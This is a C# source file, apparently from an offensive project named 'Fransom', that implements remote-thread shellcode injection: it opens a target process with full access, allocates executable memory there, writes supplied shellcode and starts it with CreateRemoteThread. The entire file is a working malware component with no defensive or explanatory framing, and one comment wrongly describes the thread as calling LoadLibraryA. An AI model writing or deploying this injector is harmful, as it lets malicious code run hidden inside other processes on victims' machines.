using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Fransom
{
    class RemoteThread
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public void Run(int pid, byte[] shellcode)
        {
            Process targetProcess = Process.GetProcessById(pid);

            IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);

            // Allocate a memory space in target process, big enough to store the shellcode
            IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

            // Write the shellcode
            UIntPtr bytesWritten;
            WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, (uint)(shellcode.Length), out bytesWritten);

            // Create a thread that will call LoadLibraryA with allocMemAddress as argument
            if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Logger.WriteLine("Injection done!");
            }
            else
            {
                Logger.WriteLine("Injection failed!");
            }
        }
    }
}
